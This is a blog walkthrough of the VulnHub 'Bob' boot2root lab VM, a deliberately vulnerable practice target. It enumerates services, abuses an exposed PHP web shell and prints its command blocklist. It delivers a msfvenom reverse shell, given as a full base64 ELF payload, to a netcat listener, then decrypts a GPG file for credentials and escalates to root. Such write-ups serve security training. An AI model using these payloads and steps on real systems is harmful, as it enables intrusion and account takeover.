---
layout: post
date: 2018-05-12 20:56:26 +0000
title: "Don't Mess with the Admin"
category: Walkthrough
tags: [VulnHub, Bob]
comments: true
image:
  feature: frog.jpg
  credit: Alexas_Fotos / Pixabay
  creditlink: https://pixabay.com/en/frog-figure-files-stack-1339892/
---

This post documents the complete walkthrough of Bob: 1.0.1, a boot2root [VM][1] created by [c0rruptedb1t][2], and hosted at [VulnHub][3]. If you are uncomfortable with spoilers, please stop reading now.
{: .notice}

<!--more-->

### Background

Someone attacked the Milburg Highschool Server. The IT staff took down their Windows server and replaced it with a Linux server running Debian. Find the weak points in the new server.

### Information Gathering

Let's kick this off with a `nmap` scan to establish the available services in the host.

```
# nmap -n -v -Pn -p- -A --reason -oN nmap.txt 192.168.20.130
...
PORT      STATE SERVICE REASON         VERSION
80/tcp    open  http    syn-ack ttl 64 Apache httpd 2.4.25 ((Debian))
| http-methods:
|_  Supported Methods: OPTIONS HEAD GET POST
| http-robots.txt: 4 disallowed entries
| /login.php /dev_shell.php /lat_memo.html
|_/passwords.html
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Site doesn't have a title (text/html).
25468/tcp open  ssh     syn-ack ttl 64 OpenSSH 7.4p1 Debian 10+deb9u2 (protocol 2.0)
| ssh-hostkey:
|   2048 84:f2:f8:e5:ed:3e:14:f3:93:d4:1e:4c:41:3b:a2:a9 (RSA)
|   256 5b:98:c7:4f:84:6e:fd:56:6a:35:16:83:aa:9c:ea:f8 (ECDSA)
|_  256 39:16:56:fb:4e:0f:50:85:40:d3:53:22:41:43:38:15 (ED25519)
```

`nmap` finds `80/tcp` open, and four disallowed entries in `robots.txt`. Although the port `25468/tcp` is uncommon for SSH, nothing funky is going on here.

### Directory/Files Enumeration

Besides the unverified files from `robots.txt`, you can run the following command to look for more files. These files are the hyperlinks found in the site's main page.

```
# curl -s 192.168.20.130 | grep -Po '(href|src)=".*"' | cut -d'"' -f2
school_badge.png
index.html
news.html
about.html
contact.html
login.html
WIP.jpg
```
`contact.html` exposes the persons working in the IT department. We now know that Bob is the admin; we should probably be targeting him.

![0.c4gur4ofikg](/assets/images/posts/bob-walkthrough/0.c4gur4ofikg.png)

Otherwise, there's nothing interesting with these files except for &mdash; `dev_shell.php`; it exposes a web shell, the first attack surface. This is how the web shell looks like.

![0.jdsakljaao](/assets/images/posts/bob-walkthrough/0.jdsakljaao.png)

### Web Shell

Although the web shell allows remote execution of commands in the context of `www-data`, it filters common commands such as `cat` and `ls` and in return, displays unhelpful messages like "Nice try skid" or "Get out skid".

Essentially, `cat` reads a file's content and prints it to standard output in ASCII. If you've read permissions for the file, you can use `xxd` to achieve the same result, by first showing the content in hexadecimal, and then converting it back to ASCII before printing to standard output.

I wrote `cat.sh` to show the idea of using `xxd` as the replacement for `cat`.

{% highlight bash linenos %}
#!/bin/bash

HOST=192.168.20.130
SHELL=dev_shell.php
CMD="xxd -p $1 | tr -d '\n'"

curl \
        -s \
        --data-urlencode "in_command=$CMD" \
        $HOST/$SHELL \
| sed '29!d' \
| sed -r -e 's/^\s+//' -e 's/  <\/div>//' \
| xxd -p -r
{% endhighlight %}

Another script I wrote, `ls.sh`, uses `find` as the replacement for `ls`.

{% highlight bash linenos %}
#!/bin/bash

HOST=192.168.20.130
SHELL=dev_shell.php
CMD="find $1 -ls"

curl \
        -s \
        --data-urlencode "in_command=$CMD" \
        $HOST/$SHELL \
| sed '/<h5>/,/<\/div>/!d' \
| sed -r -e '1d' -e '$d' -e 's/^\s+//' \
| column -t
{% endhighlight %}

Using `ls.sh` to list the contents of a directory along with their permissions, is easy.
```
# ./ls.sh /var/www/html
396954  4     drwxr-xr-x  2  root  root  4096     Mar  8  23:48  /var/www/html
393294  4     -rw-r--r--  1  root  root  1560     Mar  4  14:09  /var/www/html/login.html
393280  4     -rw-r--r--  1  root  root  3145     Mar  4  14:09  /var/www/html/contact.html
393341  4     -rw-r--r--  1  root  root  84       Mar  5  04:53  /var/www/html/.hint
393297  4     -rw-r--r--  1  root  root  111      Mar  4  14:09  /var/www/html/robots.txt
393292  4     -rw-r--r--  1  root  root  1425     Mar  4  14:09  /var/www/html/index.html.bak
393286  1152  -rw-r--r--  1  root  root  1177950  Mar  4  14:09  /var/www/html/dev_shell_back.png
393293  4     -rw-r--r--  1  root  root  1925     Mar  4  14:09  /var/www/html/lat_memo.html
393301  336   -rw-r--r--  1  root  root  340400   Mar  4  14:09  /var/www/html/WIP.jpg
393295  4     -rw-r--r--  1  root  root  4086     Mar  4  14:09  /var/www/html/news.html
393275  4     -rw-r--r--  1  root  root  2579     Mar  8  23:43  /var/www/html/about.html
393288  4     -rw-r--r--  1  root  root  1361     Mar  4  14:09  /var/www/html/dev_shell.php.bak
393299  28    -rw-r--r--  1  root  root  26357    Mar  4  14:09  /var/www/html/school_badge.png
393287  4     -rw-r--r--  1  root  root  1396     Mar  4  14:09  /var/www/html/dev_shell.php
397124  4     -rw-r--r--  1  root  root  1425     Mar  4  14:09  /var/www/html/index.html
393296  4     -rw-r--r--  1  root  root  673      Mar  8  23:43  /var/www/html/passwords.html
```

I can then use `cat.sh` to display the contents of any file where `www-data` has read permissions. For example, let's find out what's in `dev_shell.php`.

```
# ./cat.sh /var/www/html/dev_shell.php
...
  <?php
    //init
    $invalid = 0;
    $command = ($_POST['in_command']);
    $bad_words = array("pwd", "ls", "netcat", "ssh", "wget", "ping", "traceroute", "cat", "nc");
  ?>
  ...
    <?php
    system("running command...");
      //executes system Command
      //checks for sneaky ;
      if (strpos($command, ';') !==false){
        system("echo Nice try skid, but you will never get through this bulletproof php code"); //doesn't work :P
      }
      else{
        $is_he_a_bad_man = explode(' ', trim($command));
        //checks for dangerous commands
        if (in_array($is_he_a_bad_man[0], $bad_words)){
          system("echo Get out skid lol");
        }
        else{
          system($_POST['in_command']);
        }
      }
    ?>
  ...
```

Now that we know how `dev_shell.php` works, we can work towards getting ourselves as proper shell.

### Low-privilege Shell

Here's an overview of how we can get a low-privilege shell:

1. Generate a reverse shell with `msfvenom` on your attacking machine
2. Set up `netcat` listener on your attacking machine
3. Encode the reverse shell in `base64` on your attacking machine
4. Run `echo -n [output from Step 3] | base64 -d > /tmp/rev` in the web shell
5. Run `chmod +x /tmp/rev` in the web shell
6. Run `/tmp/rev` in the web shell

***Step 1: Generate a reverse shell with `msfvenom` on your attacking machine***

Before you generate the reverse shell, you need to determine the OS architecture the target host is running &mdash; by running `uname -a` in the web shell; `msfvenom` need this information to generate the executable reverse shell.

![0.roxsyv6gela](/assets/images/posts/bob-walkthrough/0.roxsyv6gela.png)

The target host is running 64-bit Debian.

```
# msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.20.128 LPORT=4444 -a x64 --platform linux -f elf -o rev
No encoder or badchars specified, outputting raw payload
Payload size: 74 bytes
Final size of elf file: 194 bytes
Saved as: rev
```

***Step 2: Set up `netcat` listener on your attacking machine***

```
# nc -lnvp 4444
```

***Step 3: Encode the reverse shell in `base64` on your attacking machine***

```
# base64 rev | tr -d  '\n' && echo
f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAAeABAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAEAAOAABAAAAAAAAAAEAAAAHAAAAAAAAAAAAAAAAAEAAAAAAAAAAQAAAAAAAwgAAAAAAAAAMAQAAAAAAAAAQAAAAAAAAailYmWoCX2oBXg8FSJdIuQIAEVzAqBSAUUiJ5moQWmoqWA8FagNeSP/OaiFYDwV19mo7WJlIuy9iaW4vc2gAU0iJ51JXSInmDwU=
```

***Step 4: Run `echo -n [output from Step 3] | base64 -d > /tmp/rev` in the web shell***

Because the output of this step ends up in file redirection, you don't see anything visible in the web shell. You can use `md5sum` for verification on your attacking machine and in the web shell &mdash; to ensure the integrity of the reverse shell is intact and not modified.

```
# md5sum rev
f05a125872c14d573304819ac2997782  rev
```
![0.rxt6dcx6xhs](/assets/images/posts/bob-walkthrough/0.rxt6dcx6xhs.png)

Good. Both hashes are identical; both files are identical as well.

***Step 5: Run `chmod +x /tmp/rev` in the web shell***

Although this step produces no visible output, you can use `ls.sh` to verify that `rev` is executable.

![0.kscltrqq2b](/assets/images/posts/bob-walkthrough/0.kscltrqq2b.png)

***Step 6: Run `/tmp/rev` in the web shell***

After this step, you should see a reverse shell in your `netcat` listener like so.

![0.zcmr8cq5i6l](/assets/images/posts/bob-walkthrough/0.zcmr8cq5i6l.png)

You can spawn a better-looking shell with output control in Python.

![0.hgd8uk3pqv](/assets/images/posts/bob-walkthrough/0.hgd8uk3pqv.png)

### Privilege Escalation

Depending on how fast you operate, the following information should be at your fingertips:

* Four accounts in the host: `bob`, `elliot`, `jc` and `seb`. They already made their first appearance in `contact.html`.
* One account is missing: `c0rruptedb1t`
* Bob is a man of secrets. He kept the following files at different locations:
  * `staff.txt`, a text file dissing everyone in the IT department except himself.
  * `.old_passwordfile.html`, the original copy of `passwords.html` &mdash; contains the passwords of `jc` and `seb`.
  * `notes.sh`, a `bash` script that spits out incoherent phrases.
  * `login.txt.gpg`, a file encrypted with symmetric cipher AES.
* For some reason, Elliot detests Bob, and so he decided to change his password to `theadminisdumb`.

Looking on as an outsider, the submerged power struggle and office politics among the IT folks of Milburg High is starting to surface, following the first security breach. I can't imagine what will happen if there's another security breach.

Like I said before, Bob is probaby the one we should be targeting, judging from the secrets he has been harboring. If I'd to guess, I'd say `login.txt.gpg` contains Bob's password and `notes.sh` contains the hints to decrypt `login.txt.gpg`.

First, let's use `scp` to copy `login.txt.gpg` and `notes.sh` to my attacking machine. Both files are readable by everyone.

![0.fakh2xng4i](/assets/images/posts/bob-walkthrough/0.fakh2xng4i.png)

```
# scp -P 25468 jc@192.168.20.130:/home/bob/Documents/login.gpg .
# scp -P 25468 jc@192.168.20.130:/home/bob/Documents/Secret/Keep_Out/Not_Porn/No_Lookie_In_Here/notes.sh .
```
Next, build a wordlist from the words in `notes.sh` like so.

```
# ./notes.sh | grep -Po '[a-zA-Z]+' > wordlist
# wc -l wordlist
60 wordlist
```
I googled and found [PGPCrack-NG](https://github.com/kholia/PGPCrack-NG). According to the project description,

>PGPCrack-NG is a program designed to brute-force symmetrically encrypted PGP files

Fits the bill down to a T. Precisely what I need.

Like a child who found a new toy, I ran PGPCrack-NG with the wordlist and waited for the password to appear. No results at all. This can't be true.

I ran `notes.sh` again. I kept staring at it. And then the **epiphany** came&hellip;

![0.z6pd10vab8](/assets/images/posts/bob-walkthrough/0.z6pd10vab8.png)

```
# ./notes.sh | sed 1d | cut -c1 | tr -d '\n' && echo
HARPOCRATES
```

According to [Wikipedia](https://en.wikipedia.org/wiki/Harpocrates), Harpocrates (Ancient Greek: Ἁρποκράτης) was the god of silence, secrets and confidentiality in the Hellenistic religion developed in Ptolemaic Alexandria (and also an embodiment of hope, according to Plutarch).

This must be the password to decrypt `login.txt.gpg`.

```
# gpg -d --passphrase HARPOCRATES --batch login.txt.gpg
gpg: AES encrypted data
gpg: encrypted with 1 passphrase
bob:b0bcat_
```

Sweet.

With Bob's password, I can SSH to his account and guess what. Bob is the admin alright.

![0.b3jv5cza3s](/assets/images/posts/bob-walkthrough/0.b3jv5cza3s.png)

Elevating to `root` is one command away &mdash; `sudo -s`.

:dancer:

[1]: https://www.vulnhub.com/series/bob,152/
[2]: http://c0rruptedb1t.ddns.net/
[3]: https://www.vulnhub.com